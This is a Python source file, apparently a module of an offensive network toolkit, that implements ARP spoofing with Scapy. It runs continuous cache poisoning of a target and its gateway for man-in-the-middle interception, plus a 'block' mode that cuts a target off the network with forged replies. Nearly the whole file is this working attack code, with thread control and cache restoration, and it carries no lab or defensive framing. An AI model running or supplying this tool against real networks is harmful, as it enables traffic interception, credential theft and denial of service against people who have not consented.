"""
arp_engine.py — ARP Spoofing Engine.

two_way     : Man-in-the-middle — poisons both target and gateway
one_way_block: Sends gratuitous ARP only to target, breaking its routing
               (used automatically for blacklisted IPs)
"""

import threading
import time
import logging

log = logging.getLogger("offensive.arp_engine")

_stop_event = threading.Event()
_thread     = None

try:
    from scapy.all import ARP, Ether, send, get_if_hwaddr, getmacbyip
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


def _get_mac(ip: str) -> str | None:
    try:
        mac = getmacbyip(ip)
        return mac
    except Exception:
        return None


def _restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Send correct ARP replies to restore normal routing."""
    try:
        send(ARP(op=2, pdst=target_ip,  hwdst=target_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=target_ip,  hwsrc=target_mac),  count=4, verbose=False)
        log.info("[ARP] Tables restored.")
    except Exception as e:
        log.error(f"[ARP] Restore error: {e}")


def _run(target_ip, gateway_ip, iface, mode):
    log.info(f"[ARP] Starting {mode} — target={target_ip} gw={gateway_ip}")

    target_mac  = _get_mac(target_ip)
    gateway_mac = _get_mac(gateway_ip)

    if not target_mac:
        log.error(f"[ARP] Cannot resolve MAC for {target_ip}")
        return
    if not gateway_mac and mode == "two_way":
        log.error(f"[ARP] Cannot resolve MAC for {gateway_ip}")
        return

    try:
        own_mac = get_if_hwaddr(iface)
    except Exception:
        own_mac = "ff:ff:ff:ff:ff:ff"

    while not _stop_event.is_set():
        try:
            if mode == "two_way":
                # Poison target: "gateway IP is at MY MAC"
                send(ARP(op=2, pdst=target_ip,  hwdst=target_mac,
                         psrc=gateway_ip, hwsrc=own_mac),
                     iface=iface, verbose=False)
                # Poison gateway: "target IP is at MY MAC"
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                         psrc=target_ip,  hwsrc=own_mac),
                     iface=iface, verbose=False)

            elif mode == "one_way_block":
                # Break target's routing without intercepting
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=gateway_ip, hwsrc="00:00:00:00:00:00"),
                     iface=iface, verbose=False)

        except Exception as e:
            log.error(f"[ARP] Send error: {e}")

        time.sleep(2)

    # Restore on exit
    if mode == "two_way" and target_mac and gateway_mac:
        _restore(target_ip, target_mac, gateway_ip, gateway_mac)


def start(target_ip: str, gateway_ip: str, iface: str = "eth0",
          mode: str = "two_way"):
    global _thread
    if not SCAPY_OK:
        log.error("Scapy not available.")
        return
    if _thread and _thread.is_alive():
        stop()
        time.sleep(1)
    _stop_event.clear()
    _thread = threading.Thread(
        target=_run, args=(target_ip, gateway_ip, iface, mode),
        name="arp_engine", daemon=True)
    _thread.start()


def stop():
    _stop_event.set()
    log.info("[ARP] Stop signal sent.")


def is_running() -> bool:
    return bool(_thread and _thread.is_alive() and not _stop_event.is_set())
